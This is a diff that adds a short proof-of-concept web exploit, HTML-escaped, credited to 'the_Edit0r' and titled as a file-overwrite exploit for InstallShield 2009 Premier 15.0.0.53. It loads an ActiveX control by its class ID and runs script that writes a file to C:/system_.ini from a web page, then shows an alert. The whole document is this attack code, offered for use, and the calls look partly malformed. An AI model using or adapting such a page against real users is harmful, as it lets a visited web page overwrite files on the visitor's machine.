@@ -1,0 +1,17 @@
+# Part Expl0it &amp; Bug Codes ( Poc ) : 
+------------------------------------
+
+&lt;b&gt;
+Installshiled 2009 premier 15.0.0.53 File Overwrite Expl0it &lt;b/&gt;
+                     by : the_Edit0r                        &lt;b/&gt;
+&lt;b/&gt;
+&lt;object classid=&#039;clsid:34E7A6F9-F260-46BD-AAC8-1E70E22139D2&#039; id=&#039;Edit0r&#039;&gt;&lt;/object&gt;
+&lt;script&gt;
+
+try{
+    var obj = document.InsertCustomAction(&#039;Edit0r&#039;);
+    obj.AddPage(1);
+    obj.SaveToFile(&quot;C:/system_.ini&quot;);
+    window.alert(&#039;check C:&#039;);
+} catch(err){  window.alert(&#039;Poc failed&#039;); }
+&lt;/script&gt;
